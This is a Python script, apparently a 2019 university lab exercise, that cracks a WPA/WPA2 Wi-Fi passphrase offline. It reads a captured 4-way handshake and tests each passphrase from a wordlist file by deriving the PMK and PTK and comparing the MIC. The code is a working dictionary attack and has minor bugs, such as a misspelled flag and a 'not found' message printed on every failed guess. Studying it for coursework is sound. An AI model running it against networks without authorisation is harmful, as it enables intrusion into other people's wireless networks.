#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Youndzo Francine && YImnaing"
__copyright__   = "Copyright 2019, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "francine.youndzokengne@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
isPassPhrase  = False
#passphrase recovery from the local file
file=open("wordList.txt")
file_content=file.read()
passPhrase=file_content.split()

#mac adress , ssid and client recovery
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
APmac       = a2b_hex(str(wpa[0].addr2).replace(':',''))
Clientmac   = a2b_hex(str(wpa[0].addr1).replace(':',''))
ssid        = wpa[0].info

# Authenticator and Supplicant Nonces
ANonce      = a2b_hex((wpa[5].load).encode("hex")[26:90])
SNonce      = a2b_hex((wpa[6].load).encode("hex")[26:90])



B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
#data recovery
data      = b2a_hex(str((wpa[8])[EAPOL]))
data2     =list(data)

for i in range(162,194):
    data2[i] = '0'

data2 = a2b_hex(("-".join(data2)).replace("-", ""))


# This is the MIC contained in the 4th frame of the 4-way handshake
mic_to_test = (wpa[8].load).encode("hex")[154:186]

#found the passPhrase with "brute force" method
for phrase in passPhrase:
    pmk = pbkdf2_hex(phrase, ssid, 4096, 32)      #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    ptk = customPRF512(a2b_hex(pmk),A,B)          #expand pmk to obtain PTK
    mic = hmac.new(ptk[0:16],data2,hashlib.sha1)  #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK

   #MICs comparison
    mic1 = str(mic.hexdigest())[:-8]    
    if(str(mic_to_test) == str(mic1)):

        isPassphrase = True

        print "\n"
        print "the passphrase found is:\t\t", phrase , "\n"
        #recovery of mac adress, ssid and AP
        print "\n\nValues used to derivate keys"
        print "============================"
        print "APP_MAC:\t\t",b2a_hex(data2),"\n"
        print "APP_MAC:\t\t ",b2a_hex(APmac),"\n"
        print "SSID:\t\t",str(ssid),"\n"
        print "AP Mac:\t\t",b2a_hex(APmac),"\n"
        print "CLient Mac:\t\t",b2a_hex(Clientmac),"\n"
        print "AP Nonce:\t\t",b2a_hex(ANonce),"\n"
        print "Client Nonce:\t\t",b2a_hex(SNonce),"\n"

        print "\nResults of the key expansion"
        print "============================="
        print "PMK:\t\t",pmk,"\n"
        print "PTK:\t\t",b2a_hex(ptk),"\n"
        print "KCK:\t\t",b2a_hex(ptk[0:16]),"\n"
        print "KEK:\t\t",b2a_hex(ptk[16:32]),"\n"
        print "TK:\t\t",b2a_hex(ptk[32:48]),"\n"
        print "MICK:\t\t",b2a_hex(ptk[48:64]),"\n"
        print "MIC:\t\t",mic.hexdigest(),"\n"
        break

    else:
    
        print "\n"
        print "passpharse is not found in dictionary "
